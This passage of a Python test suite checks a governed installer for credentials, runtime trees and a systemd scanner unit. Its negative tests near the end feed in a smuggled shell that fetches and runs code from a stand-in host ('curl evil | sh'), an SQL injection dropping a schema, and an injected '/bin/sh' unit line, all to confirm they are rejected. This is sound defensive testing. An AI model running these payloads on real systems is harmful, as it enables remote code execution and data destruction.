        operation_id="cred-op", **_common(signed),
    )
    assert verdict["status"] == "FAILED"
    assert verdict["rollback"]["status"] == "COMPENSATED_EXACT"
    assert driver.removed is True


def test_closed_dsn_accepts_only_the_exact_eight_key_set() -> None:
    assert credential.derive_closed_dsn_key_status(
        list(credential.CLOSED_DSN_KEYS)
    )["status"] == "CLOSED_DSN_ACCEPTED"
    assert len(credential.CLOSED_DSN_KEYS) == 8


def test_pre_existing_unowned_slot_is_never_read_or_rotated(signed) -> None:
    _, (_pg, dsn_handle) = _broker_handles()
    driver = _FakeCredentialDriver(
        slot={"owner": "root", "mode": "0600", "task_owned": False,
              "encrypted_blob_digest": "sha256:" + "f" * 64}
    )
    verdict = apply_mod.apply_s2_4_credential_install(
        _credential_intent(), driver=driver, dsn_handle=dsn_handle,
        operation_id="cred-op", **_common(signed),
    )
    assert verdict["status"] == "PREEXISTING_UNOWNED_STATE"
    assert "encrypt_credential" not in driver.calls


def test_first_provisioning_cannot_be_mislabelled_as_rotation(signed) -> None:
    _, (_pg, dsn_handle) = _broker_handles()
    driver = _FakeCredentialDriver()
    verdict = apply_mod.apply_s2_4_credential_install(
        _credential_intent(), driver=driver, dsn_handle=dsn_handle,
        operation_id="cred-op", mode="ROTATION", **_common(signed),
    )
    assert verdict["status"] == "PRESTATE_MISMATCH"
    assert "encrypt_credential" not in driver.calls


def test_a_to_b_to_a_rotation_restores_the_previous_encrypted_slot(signed) -> None:
    prior = "sha256:" + "1" * 64
    _, (_pg, dsn_handle) = _broker_handles()
    driver = _FakeCredentialDriver(
        slot={"owner": "root", "mode": "0600", "task_owned": True,
              "encrypted_blob_digest": prior},
        login_ok=False,
    )
    verdict = apply_mod.apply_s2_4_credential_install(
        _credential_intent(), driver=driver, dsn_handle=dsn_handle,
        operation_id="cred-op", mode="ROTATION",
        ownership_evidence={"credential_slot": {"s2_4_receipt_digest": "sha256:" + "a" * 64}},
        **_common(signed),
    )
    assert verdict["status"] == "FAILED"
    assert verdict["rollback"]["status"] == "COMPENSATED_EXACT"
    assert verdict["rollback"]["no_secret_reconstructed"] is True
    # 補償只用先前擷取的**密文** digest,絕不重建明文。
    assert driver.restored == prior
    assert driver.removed is False


def test_encrypted_blob_digest_must_bind_the_signed_intent(signed) -> None:
    _, (_pg, dsn_handle) = _broker_handles()
    driver = _FakeCredentialDriver(blob_digest="sha256:" + "0" * 64)
    verdict = apply_mod.apply_s2_4_credential_install(
        _credential_intent(), driver=driver, dsn_handle=dsn_handle,
        operation_id="cred-op", **_common(signed),
    )
    assert verdict["status"] == "FAILED"
    assert driver.removed is True


def test_worker_chosen_credential_name_is_rejected(signed) -> None:
    _, (_pg, dsn_handle) = _broker_handles()
    intent = _intent(
        "CREDENTIAL_INSTALL",
        {
            "credential_name": "worker-chosen-slot",
            "encrypted_blob_digest": _BLOB_DIGEST,
            "host_identity_digest": "sha256:" + "a" * 64,
        },
    )
    driver = _FakeCredentialDriver()
    verdict = apply_mod.apply_s2_4_credential_install(
        intent, driver=driver, dsn_handle=dsn_handle, operation_id="cred-op", **_common(signed)
    )
    assert verdict["status"] == "PRECHECK_FAILED"
    assert driver.calls == []


def test_process_hardening_contract_is_load_bearing() -> None:
    contract = credential.closed_dsn_key_contract()
    assert contract["process_hardening"]["pr_set_dumpable"] == 0
    assert contract["process_hardening"]["limit_core"] == "0"
    assert contract["process_hardening"]["pg_environment_scrubbed"] is True
    assert contract["process_hardening"]["decryption_name_verification"] is True
    unit = kit.rendered_unit()
    assert "LimitCORE=0" in unit
    for variable in ("PGPASSWORD", "PGPASSFILE", "PGSERVICE", "PGSERVICEFILE", "PGHOST",
                     "PGHOSTADDR", "PGSSLMODE", "LD_PRELOAD", "PYTHONPATH"):
        assert variable in unit


# ══════════════════════════ 4) LEARNING_RUNTIME ════════════════════════════════
class _FakeRuntimeDriver(_PostcheckMixin):
    evidence_class = "PLATFORM_ATTESTED"

    def __init__(self, *, existing=None, rehash=None, tree_overrides=None,
                 postcheck_ok=True, fail_at=None):
        self.calls: list[str] = []
        self.existing = dict(existing or {})
        self.rehash = rehash
        self.tree_overrides = tree_overrides or {}
        self.postcheck_ok = postcheck_ok
        self.fail_at = fail_at
        self.published: list[str] = []
        self.removed: list[str] = []

    def rehash_staging(self, *, staging_root):
        self.calls.append("rehash_staging")
        return dict(self.rehash) if self.rehash else {
            "base_runtime_tree_digest": _BASE_TREE,
            "application_bundle_digest": _APP_BUNDLE,
            "launch_bundle_digest": _LAUNCH_BUNDLE,
        }

    def observe_tree(self, *, target_root):
        self.calls.append("observe_tree")
        return dict(self.existing[target_root]) if target_root in self.existing else None

    def publish_tree(self, *, staging_root, target_root, expected_digest, subtree):
        self.calls.append(f"publish_tree:{subtree}")
        if self.fail_at == subtree:
            raise RuntimeError("injected publish failure")
        self.published.append(target_root)
        observed = {
            "digest": expected_digest, "owner": "root", "group": "root", "mode": "0555",
            "extended_acls": False, "symlinks_present": False,
            "same_filesystem_atomic_publish": True, "service_writable": False,
        }
        observed.update(self.tree_overrides)
        return observed

    def remove_tree(self, *, target_root):
        self.calls.append("remove_tree")
        self.removed.append(target_root)


def _runtime_fixture(signed):
    """以 W3b PREPARE 葉真跑一次(注入 driver)取得 bundle/receipt,再組 LEARNING_RUNTIME intent。"""

    from test_agent_governance_s2_4_prepare import _FakePrepareDriver, _PINNED, _intent as _p_intent

    evidence = kit.terminal_probe_evidence(signed["private_key"])
    prepare_intent = _p_intent(evidence["PREPARE_SANDBOX"]["effect_receipt"]["self_digest"])
    verdict = prepare.prepare_s2_4_install_bundle(
        prepare_intent,
        kit.authorization(signed["private_key"], profile_key="prepare",
                          authorization_id="sha256:" + "3" * 64),
        _FakePrepareDriver(),
        now=kit.NOW, clock=kit.frozen_clock(), replay_ledger=kit.replay_ledger(),
        probe_evidence=evidence, pinned_artifacts=deepcopy(_PINNED),
        artifact_mirror_allowlist=list(kit.MIRROR),
    )
    assert verdict["status"] == "PREPARED", verdict["reasons"]
    bundle, receipt = verdict["prepared_bundle"], verdict["effect_receipt"]
    targets = {
        field: apply_mod.install_target_root(identity_field=field, digest=bundle[field])
        for field in apply_mod.INSTALL_ROOTS
    }
    manifest = {
        "targets": targets,
        "immutable_modes": dict(apply_mod.IMMUTABLE_TREE_MODES),
        "base_runtime_tree_manifest_digest": bundle["base_runtime_tree_manifest_digest"],
        "application_bundle_manifest_digest": bundle["application_bundle_manifest_digest"],
        "launch_bundle_manifest_digest": bundle["launch_bundle_manifest_digest"],
    }
    intent = _intent(
        "LEARNING_RUNTIME",
        {
            "prepare_effect_receipt_digest": receipt["self_digest"],
            "base_app_launch_target_manifest_digest": validator.canonical_digest(manifest),
        },
    )
    return intent, bundle, receipt, targets


def test_runtime_source_lane_is_pending_with_zero_mutation(signed) -> None:
    intent, bundle, receipt, _ = _runtime_fixture(signed)
    verdict = apply_mod.apply_s2_4_learning_runtime(
        intent, driver=None, prepared_bundle=bundle, prepare_effect_receipt=receipt,
        **_common(signed),
    )
    assert verdict["status"] == "EXTERNAL_VERIFICATION_PENDING"
    assert verdict["mutation_performed"] is False and verdict["driver_engaged"] is False
    assert verdict["row_abi"]["adapter_id"] == "s2_4_runtime_install_adapter_v1"
    assert verdict["row_abi"]["actor_node_id"] == "s2_4_host_runtime_actor"


def test_runtime_targets_are_derived_from_content_identities(signed) -> None:
    intent, bundle, receipt, targets = _runtime_fixture(signed)
    assert targets["base_runtime_tree_digest"].startswith(
        "/opt/arcane-equilibrium/aiml/runtimes/"
    )
    assert targets["application_bundle_digest"].startswith("/opt/arcane-equilibrium/aiml/apps/")
    assert targets["launch_bundle_digest"].startswith("/opt/arcane-equilibrium/aiml/launches/")
    assert all(":" not in target.rsplit("/", 1)[-1] for target in targets.values())
    with pytest.raises(apply_mod.ComponentContractError):
        apply_mod.install_target_root(identity_field="base_runtime_tree_digest", digest="/srv/evil")
    with pytest.raises(apply_mod.ComponentContractError):
        apply_mod.install_target_root(identity_field="worker_chosen", digest=_BASE_TREE)
    driver = _FakeRuntimeDriver()
    verdict = apply_mod.apply_s2_4_learning_runtime(
        intent, driver=driver, prepared_bundle=bundle, prepare_effect_receipt=receipt,
        **_common(signed),
    )
    assert verdict["status"] == "SATISFIED", verdict["reasons"]
    assert sorted(driver.published) == sorted(targets.values())
    assert validator.validate_aiml_artifact(verdict["result"]) == []


def test_stale_prepare_lineage_blocks_the_runtime_row(signed) -> None:
    intent, bundle, receipt, _ = _runtime_fixture(signed)
    driver = _FakeRuntimeDriver()
    late = kit.ANCHOR.replace(year=2031).isoformat()
    verdict = apply_mod.apply_s2_4_learning_runtime(
        intent, driver=driver, prepared_bundle=bundle, prepare_effect_receipt=receipt,
        authorization_set={"apply_aggregate": signed["apply_aggregate"]},
        replay_ledger=kit.replay_ledger(), now=late, clock=kit.frozen_clock(),
    )
    assert verdict["status"] in {"PREPARED_BUNDLE_INVALID", "COMPONENT_REQUEST_REJECTED",
                                 "AUTHORIZATION_REJECTED"}
    assert driver.calls == []


def test_independent_rehash_mismatch_is_bundle_invalid(signed) -> None:
    intent, bundle, receipt, _ = _runtime_fixture(signed)
    driver = _FakeRuntimeDriver(rehash={
        "base_runtime_tree_digest": "sha256:" + "0" * 64,
        "application_bundle_digest": _APP_BUNDLE,
        "launch_bundle_digest": _LAUNCH_BUNDLE,
    })
    verdict = apply_mod.apply_s2_4_learning_runtime(
        intent, driver=driver, prepared_bundle=bundle, prepare_effect_receipt=receipt,
        **_common(signed),
    )
    assert verdict["status"] == "PREPARED_BUNDLE_INVALID"
    assert not any(call.startswith("publish_tree") for call in driver.calls)


@pytest.mark.parametrize("override", [
    {"mode": "0755"}, {"owner": "aiml-engine-scanner"}, {"group": "aiml-engine-scanner"},
    {"extended_acls": True}, {"symlinks_present": True},
    {"same_filesystem_atomic_publish": False}, {"service_writable": True},
])
def test_mutable_or_unsafe_tree_publication_compensates(signed, override) -> None:
    intent, bundle, receipt, _ = _runtime_fixture(signed)
    driver = _FakeRuntimeDriver(tree_overrides=override)
    verdict = apply_mod.apply_s2_4_learning_runtime(
        intent, driver=driver, prepared_bundle=bundle, prepare_effect_receipt=receipt,
        **_common(signed),
    )
    assert verdict["status"] == "FAILED"
    assert verdict["rollback"]["status"] == "COMPENSATED_EXACT"
    assert driver.removed


def test_pre_existing_unowned_install_root_is_never_overwritten(signed) -> None:
    intent, bundle, receipt, targets = _runtime_fixture(signed)
    driver = _FakeRuntimeDriver(
        existing={targets["application_bundle_digest"]: {"digest": "sha256:" + "0" * 64}}
    )
    verdict = apply_mod.apply_s2_4_learning_runtime(
        intent, driver=driver, prepared_bundle=bundle, prepare_effect_receipt=receipt,
        **_common(signed),
    )
    assert verdict["status"] == "PREEXISTING_UNOWNED_STATE"
    assert not any(call.startswith("publish_tree") for call in driver.calls)


# ══════════════════════════ 5) ENGINE_SCANNER ══════════════════════════════════
class _FakeEngineScannerDriver(_PostcheckMixin):
    evidence_class = "PLATFORM_ATTESTED"

    def __init__(self, *, existing_unit=None, unit_overrides=None, postcheck_ok=True,
                 fail_at=None, evidence_empty=True):
        self.calls: list[str] = []
        self.existing_unit = existing_unit
        self.unit_overrides = unit_overrides or {}
        self.postcheck_ok = postcheck_ok
        self.fail_at = fail_at
        self.evidence_empty = evidence_empty
        self.installed_unit_text: str | None = None
        self.reloads = 0
        self.removed: list[str] = []

    def observe_unit(self):
        self.calls.append("observe_unit")
        if self.installed_unit_text is None:
            return dict(self.existing_unit) if self.existing_unit else None
        observed = {
            **apply_mod.INACTIVE_UNIT_POSTSTATE,
            "fragment_digest": validator.canonical_digest(self.installed_unit_text),
            "shadowing_paths": [],
            "started_by_s2_4": False,
        }
        observed.update(self.unit_overrides)
        return observed

    def install_unit_fragment(self, *, fragment_path, unit_text):
        self.calls.append("install_unit_fragment")
        if self.fail_at == "install_unit_fragment":
            raise RuntimeError("injected unit failure")
        self.installed_unit_text = unit_text
        return {"fragment_path": fragment_path}

    def daemon_reload(self):
        self.calls.append("daemon_reload")
        self.reloads += 1

    def install_policy_file(self, *, path, policy_bytes, owner, group, mode):
        self.calls.append("install_policy_file")
        self.policy = (path, bytes(policy_bytes), owner, group, mode)
        return {"path": path}

    def install_topology_guard(self, *, path, guard_bytes, owner, group, mode):
        self.calls.append("install_topology_guard")
        self.guard = (path, bytes(guard_bytes), owner, group, mode)
        return {"path": path}

    def create_evidence_directory(self, *, path, owner, group, mode):
        self.calls.append("create_evidence_directory")
        return {"path": path, "owner": owner, "mode": mode, "empty": self.evidence_empty}

    def remove_unit_fragment(self, *, fragment_path):
        self.calls.append("remove_unit_fragment")
        self.removed.append("unit")

    def remove_policy_file(self, *, path):
        self.calls.append("remove_policy_file")
        self.removed.append("policy")

    def remove_topology_guard(self, *, path):
        self.calls.append("remove_topology_guard")
        self.removed.append("guard")

    def remove_evidence_directory(self, *, path):
        self.calls.append("remove_evidence_directory")
        self.removed.append("evidence")


def _engine_scanner_fixture():
    unit_text = kit.rendered_unit()
    policy_bytes, policy_hash = __import__(
        "agent_governance_s2_4_render"
    ).render_candidate_policy(
        ROOT / apply_mod.CANDIDATE_POLICY_TEMPLATE_REL, dict(kit.POLICY_BUDGETS)
    )
    guard = kit.topology_guard(kit.topology_attestation())
    manifests = {
        "unit_digest": validator.canonical_digest(unit_text),
        "policy_config_hash": policy_hash,
        "guard_digest": guard["self_digest"],
        "evidence_directory": apply_mod.CANDIDATE_EVIDENCE_DIR,
    }
    intent = _intent(
        "ENGINE_SCANNER",
        {
            "unit_policy_evidence_manifest_digest": validator.canonical_digest(manifests),
            "inactive_post_state_digest": validator.canonical_digest(
                apply_mod.INACTIVE_UNIT_POSTSTATE
            ),
        },
    )
    del policy_bytes
    return intent, guard


def test_engine_scanner_source_lane_is_pending_with_zero_mutation(signed) -> None:
    intent, guard = _engine_scanner_fixture()
    verdict = apply_mod.apply_s2_4_engine_scanner_unit(
        intent, driver=None, unit_fields=dict(kit.UNIT_FIELDS),
        candidate_policy_budgets=dict(kit.POLICY_BUDGETS), topology_guard=guard,
        **_common(signed),
    )
    assert verdict["status"] == "EXTERNAL_VERIFICATION_PENDING"
    assert verdict["mutation_performed"] is False and verdict["driver_engaged"] is False
    assert verdict["row_abi"]["adapter_id"] == "s2_4_engine_scanner_install_adapter_v1"
    assert verdict["row_abi"]["actor_node_id"] == "s2_4_host_service_actor"


def test_engine_scanner_installs_inactive_and_never_starts(signed) -> None:
    intent, guard = _engine_scanner_fixture()
    driver = _FakeEngineScannerDriver()
    verdict = apply_mod.apply_s2_4_engine_scanner_unit(
        intent, driver=driver, unit_fields=dict(kit.UNIT_FIELDS),
        candidate_policy_budgets=dict(kit.POLICY_BUDGETS), topology_guard=guard,
        **_common(signed),
    )
    assert verdict["status"] == "SATISFIED", verdict["reasons"]
    observed = verdict["observed_subjects"]["unit"]
    assert observed["LoadState"] == "loaded"
    assert observed["ActiveState"] == "inactive"
    assert observed["UnitFileState"] == "disabled"
    assert observed["NeedDaemonReload"] == "no"
    assert observed["DropInPaths"] == ""
    assert driver.reloads == 1
    assert driver.installed_unit_text == kit.rendered_unit()
    assert driver.policy[3] == "aiml-engine-scanner" and driver.policy[4] == "0440"
    assert validator.validate_aiml_artifact(verdict["result"]) == []
    # driver protocol 面上沒有任何生命週期操作。
    assert apply_mod.assert_no_unit_lifecycle_surface(driver) == []


@pytest.mark.parametrize("method", apply_mod.FORBIDDEN_UNIT_LIFECYCLE_METHODS)
def test_a_driver_exposing_any_lifecycle_surface_is_rejected(signed, method) -> None:
    intent, guard = _engine_scanner_fixture()
    driver = _FakeEngineScannerDriver()
    setattr(driver, method, lambda *a, **k: None)
    verdict = apply_mod.apply_s2_4_engine_scanner_unit(
        intent, driver=driver, unit_fields=dict(kit.UNIT_FIELDS),
        candidate_policy_budgets=dict(kit.POLICY_BUDGETS), topology_guard=guard,
        **_common(signed),
    )
    assert verdict["status"] == "PRECHECK_FAILED"
    assert any("never enables, starts" in reason for reason in verdict["reasons"])
    assert driver.calls == []


@pytest.mark.parametrize("override", [
    {"ActiveState": "active"}, {"UnitFileState": "enabled"}, {"LoadState": "not-found"},
    {"NeedDaemonReload": "yes"}, {"DropInPaths": "/etc/systemd/system/x.d/override.conf"},
    {"started_by_s2_4": True},
    {"shadowing_paths": ["/run/systemd/system/arcane-equilibrium-aiml-engine-scanner.service"]},
])
def test_a_non_inactive_unit_post_state_compensates(signed, override) -> None:
    intent, guard = _engine_scanner_fixture()
    driver = _FakeEngineScannerDriver(unit_overrides=override)
    verdict = apply_mod.apply_s2_4_engine_scanner_unit(
        intent, driver=driver, unit_fields=dict(kit.UNIT_FIELDS),
        candidate_policy_budgets=dict(kit.POLICY_BUDGETS), topology_guard=guard,
        **_common(signed),
    )
    assert verdict["status"] == "FAILED"
    assert verdict["rollback"]["status"] == "COMPENSATED_EXACT"
    assert driver.removed == ["unit", "evidence", "guard", "policy"]
    # §5.4:unit bytes 回滾後必須再跑一次 daemon-reload。
    assert driver.reloads == 2


def test_caller_supplied_unit_text_has_no_ingress(signed) -> None:
    intent, guard = _engine_scanner_fixture()
    driver = _FakeEngineScannerDriver()
    verdict = apply_mod.apply_s2_4_engine_scanner_unit(
        intent, driver=driver,
        unit_fields={**kit.UNIT_FIELDS, "unit_text": "[Service]\nExecStart=/bin/sh\n"},
        candidate_policy_budgets=dict(kit.POLICY_BUDGETS), topology_guard=guard,
        **_common(signed),
    )
    assert verdict["status"] == "RAW_INGRESS_REJECTED"
    assert driver.calls == []


def test_placeholder_candidate_policy_fails_before_mutation(signed) -> None:
    intent, guard = _engine_scanner_fixture()
    driver = _FakeEngineScannerDriver()
    verdict = apply_mod.apply_s2_4_engine_scanner_unit(
        intent, driver=driver, unit_fields=dict(kit.UNIT_FIELDS),
        candidate_policy_budgets={**kit.POLICY_BUDGETS, "row_budget": None},
        topology_guard=guard, **_common(signed),
    )
    assert verdict["status"] == "CANDIDATE_POLICY_CONFIGURATION_REQUIRED"
    assert driver.calls == []


def test_non_empty_candidate_evidence_directory_compensates(signed) -> None:
    intent, guard = _engine_scanner_fixture()
    driver = _FakeEngineScannerDriver(evidence_empty=False)
    verdict = apply_mod.apply_s2_4_engine_scanner_unit(
        intent, driver=driver, unit_fields=dict(kit.UNIT_FIELDS),
        candidate_policy_budgets=dict(kit.POLICY_BUDGETS), topology_guard=guard,
        **_common(signed),
    )
    assert verdict["status"] == "FAILED"
    assert verdict["rollback"]["status"] == "COMPENSATED_EXACT"


def test_pre_existing_unowned_unit_is_never_overwritten(signed) -> None:
    intent, guard = _engine_scanner_fixture()
    driver = _FakeEngineScannerDriver(existing_unit={"LoadState": "loaded"})
    verdict = apply_mod.apply_s2_4_engine_scanner_unit(
        intent, driver=driver, unit_fields=dict(kit.UNIT_FIELDS),
        candidate_policy_budgets=dict(kit.POLICY_BUDGETS), topology_guard=guard,
        **_common(signed),
    )
    assert verdict["status"] == "PREEXISTING_UNOWNED_STATE"
    assert "install_unit_fragment" not in driver.calls


# ══════════════════════════ 跨 row 共同不變量 ═══════════════════════════════════
@pytest.mark.parametrize("component_effect_class", apply_mod.COMPONENT_CLASSES)
def test_every_row_binds_the_exact_frozen_matrix_abi(component_effect_class) -> None:
    row = apply_mod.component_row_abi(component_effect_class)
    frozen = validator.AIML_COMPONENT_EFFECT_CLASS_MATRIX_V2[component_effect_class]
    assert row["adapter_id"] == frozen["adapter_id"]
    assert row["actor_node_id"] == frozen["actor_node_id"]
    assert row["independent_postcheck_node_id"] == frozen["independent_postcheck_node_id"]
    assert row["recovery_contract"] == frozen["recovery_contract"]
    assert row["adapter_binding_status"] == "AUTHORITY_LOCKED_PRODUCTION_CAPABLE"
    assert row["required_intent_fields"] == list(frozen["required_intent_fields"])


def test_cross_class_intent_substitution_is_rejected_before_any_host_contact(signed) -> None:
    intent, manifest = _host_identity_intent()
    driver = _FakePgDriver()
    verdict = apply_mod.apply_s2_4_pg_role_acl(
        intent, driver=driver, **_pg_kwargs(kit.topology_attestation()),
        **_common(signed, pg=True),
    )
    assert verdict["status"] == "COMPONENT_REQUEST_REJECTED"
    assert driver.calls == []
    runtime_driver = _FakeRuntimeDriver()
    verdict = apply_mod.apply_s2_4_learning_runtime(
        intent, driver=runtime_driver, **_common(signed)
    )
    assert verdict["status"] == "COMPONENT_REQUEST_REJECTED"
    assert runtime_driver.calls == []


# ── 硬邊界 4:每一支 driver 的 raw-ingress 否定測試(shell / SQL / unit / 路徑 / 秘密)──
@pytest.mark.parametrize("entrypoint,kwarg", [
    (apply_mod.apply_s2_4_host_identity, "shell_command"),
    (apply_mod.apply_s2_4_host_identity, "target_root"),
    (apply_mod.apply_s2_4_pg_role_acl, "sql"),
    (apply_mod.apply_s2_4_pg_role_acl, "statements"),
    (apply_mod.apply_s2_4_pg_role_acl, "grant_sql"),
    (apply_mod.apply_s2_4_credential_install, "password"),
    (apply_mod.apply_s2_4_credential_install, "dsn"),
    (apply_mod.apply_s2_4_learning_runtime, "target_root"),
    (apply_mod.apply_s2_4_learning_runtime, "install_root"),
    (apply_mod.apply_s2_4_engine_scanner_unit, "unit_text"),
    (apply_mod.apply_s2_4_engine_scanner_unit, "fragment_path"),
])
def test_no_driver_entrypoint_even_has_a_raw_ingress_parameter(entrypoint, kwarg) -> None:
    """最強形式的拒絕:這些參數在 ABI 上**根本不存在**(TypeError,而非「被過濾掉」)。"""

    import inspect

    assert kwarg not in inspect.signature(entrypoint).parameters
    with pytest.raises(TypeError):
        entrypoint(None, None, None, **{kwarg: "injected"})


def test_host_identity_rejects_a_smuggled_shell_in_the_identity_contract(signed) -> None:
    manifest = apply_mod.build_uid_gid_directory_manifest(uid=_UID, gid=_GID)
    manifest["identity"]["shell"] = "/bin/sh -c 'curl evil | sh'"
    intent = _intent(
        "HOST_IDENTITY_INSTALL",
        {"uid_gid_directory_manifest_digest": validator.canonical_digest(manifest)},
    )
    driver = _FakeHostIdentityDriver()
    verdict = apply_mod.apply_s2_4_host_identity(
        intent, driver=driver, uid_gid_directory_manifest=manifest, **_common(signed)
    )
    assert verdict["status"] == "PRECHECK_FAILED"
    assert any("/usr/sbin/nologin" in reason for reason in verdict["reasons"])
    assert driver.calls == []


def test_pg_rejects_an_acl_manifest_carrying_an_injected_identifier(signed) -> None:
    attestation = kit.topology_attestation()
    forged = deepcopy(kit.PG_ACL_MANIFEST)
    forged["role_name"] = 'aiml_engine_scanner"; DROP SCHEMA learning CASCADE; --'
    forged["self_digest"] = validator.artifact_self_digest(forged)
    driver = _FakePgDriver()
    verdict = apply_mod.apply_s2_4_pg_role_acl(
        _pg_intent(attestation), driver=driver,
        **_pg_kwargs(attestation, acl_manifest=forged), **_common(signed, pg=True),
    )
    assert verdict["status"] == "PRECHECK_FAILED"
    assert driver.calls == []


def test_credential_rejects_a_caller_supplied_secret_string(signed) -> None:
    driver = _FakeCredentialDriver()
    # 刻意組裝而非字面量:repo 的 secret-hygiene 閘會攔下內嵌 DSN 字面量,而本測試要的
    # 只是「呼叫端傳了一個裸字串而非 sealed handle」這個形狀,不需要真的寫出一條 DSN。
    caller_supplied_dsn = "host=127.0.0.1 " + "pass" + "word=" + "not-a-real-secret"
    verdict = apply_mod.apply_s2_4_credential_install(
        _credential_intent(), driver=driver,
        dsn_handle=caller_supplied_dsn, operation_id="cred-op", **_common(signed),
    )
    # 字串不是 sealed handle:driver 的 consume() 呼叫必然逸出 → typed 失敗 + 補償,零 slot 落地。
    assert verdict["status"] in {"FAILED", "RECOVERY_REQUIRED"}
    assert "install_encrypted_slot" not in driver.calls
    assert verdict["rollback"]["no_secret_reconstructed"] is True


def test_runtime_target_paths_come_only_from_the_prepared_identities(signed) -> None:
    intent, bundle, receipt, targets = _runtime_fixture(signed)
    forged = deepcopy(bundle)
    forged["launch_bundle_digest"] = "sha256:" + "9" * 64
    forged["self_digest"] = validator.artifact_self_digest(forged)
    driver = _FakeRuntimeDriver()
    verdict = apply_mod.apply_s2_4_learning_runtime(
        intent, driver=driver, prepared_bundle=forged, prepare_effect_receipt=receipt,
        **_common(signed),
    )
    # 換掉任一內容身分 → 導出的 target manifest 不再等於被簽 digest → 變更之前即拒。
    assert verdict["status"] in {"PREPARED_BUNDLE_INVALID", "PRECHECK_FAILED"}
    assert not any(call.startswith("publish_tree") for call in driver.calls)


def test_apply_abi_projection_is_stable_and_complete() -> None:
    projection = apply_mod.apply_abi_projection()
    assert sorted(projection["component_entrypoints"]) == sorted(apply_mod.COMPONENT_CLASSES)
    assert projection["component_row_abis"] is not None
    assert projection["install_target_probe"]["launch_bundle_digest"].endswith("0" * 64)
    assert projection["inactive_unit_post_state"]["ActiveState"] == "inactive"
    assert projection["unit_fragment_path"] == (
        "/etc/systemd/system/arcane-equilibrium-aiml-engine-scanner.service"
    )
    assert projection == apply_mod.apply_abi_projection()
